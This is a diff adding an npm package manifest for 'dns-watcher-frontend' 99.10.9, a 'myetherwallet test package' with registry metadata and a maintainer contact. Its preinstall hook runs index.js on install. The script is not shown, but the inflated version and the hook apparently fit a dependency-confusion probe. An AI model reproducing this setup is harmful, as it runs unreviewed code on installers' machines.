@@ -1,0 +1,39 @@
+{
+    "name": "dns-watcher-frontend",
+    "version": "99.10.9",
+    "description": "myetherwallet test package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "dns-watcher-frontend@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-u1bjpusF+6+a/ZhYhxXxVkrumeGiUbOmQ5dwDG+Zbv2h/5iTUnUxxaktsc36YJJbCFiJmL2FcuH7XmOEGxqX3w==",
+        "shasum": "f7b634b7cc7cc277949148cc8704f8ff7ca1b8a9",
+        "tarball": "https://registry.npmjs.org/dns-watcher-frontend/-/dns-watcher-frontend-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3234,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmp+1CRA9TVsSAnZWagAAqCAP/iLHxSeSI/4XEMY0i0TI\nPynpVniYrSZuXMYxbFcampZRRCM4329SnbniGevcwcR168mMwNVJtv9OjaXi\nQHdAHHjtnSwp3vlOO7aEUONT1M7l3VvP7A0/7ZL90ejsS0DDkQ4UUpqYZr75\n62lWvb03rq61W54lYjXhTE30dTQEQuzOgt4pASiSklFrW9YTUKiSq4w5k6m1\nehOXDTIh/ugF2Brunb9ZsDuDtcFPbA6Jiutqj8RGkbk0/6ha1+R9NPdDNMk5\naWwA11oaEN0X0sFiRTcZECedd++wWJlHtLVvSwjNF0w2lDbiWTgO0Dre3o2M\n+xZ07hSIlUf8J4gthmTLQejIDj9LGOjMcH1HlvPgF3jnShh09fOF6YLyS8u8\nzX0c61Zz0OAmHnG9QuLyiRgflN6HP5EkHvM7dwEfF+gE3lo8MoYInfj/23yX\nw7KRMMLh8uS8o3czljq4+tvbdhqqkL3FqBphHSRi3+rDNEBNn4kNESZg0eEd\nC+r1R7QHRIiCARdmeok61WEBKnGH7Pu+bS3Xtt94oMp081f0nulesdeCDzVW\ngdcuxEdblQKW6Myf/VRmh6v5xEsvmHS30maAHKG8ixEEO91ovdSNzWTw6C/T\niFr/H7rCbDCuLFSj0Pjkx8ASXV9AeA6LW+CLkygeCEndggRxu7ZwIkqr5XH+\nYkLi\r\n=+EM7\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/dns-watcher-frontend_99.10.9_1637523381662_0.5091476254552063"
+    },
+    "_hasShrinkwrap": false
+}
